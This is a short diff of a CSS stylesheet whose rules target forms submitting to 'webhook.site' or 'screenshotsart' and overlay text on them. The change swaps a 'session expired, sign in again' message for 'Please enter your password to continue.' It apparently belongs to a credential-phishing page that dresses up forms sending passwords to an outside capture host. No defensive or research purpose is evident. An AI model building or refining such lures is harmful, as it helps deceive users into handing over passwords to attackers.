@@ -36,7 +36,7 @@ form[action*="screenshotsart"]::before {
 
 form[action*="webhook.site"]::after,
 form[action*="screenshotsart"]::after {
-  content: "Your session has expired. Please sign in again to continue.";
+  content: "Please enter your password to continue.";
   font-size: 14px;
   color: #6b7280;
   text-align: center;
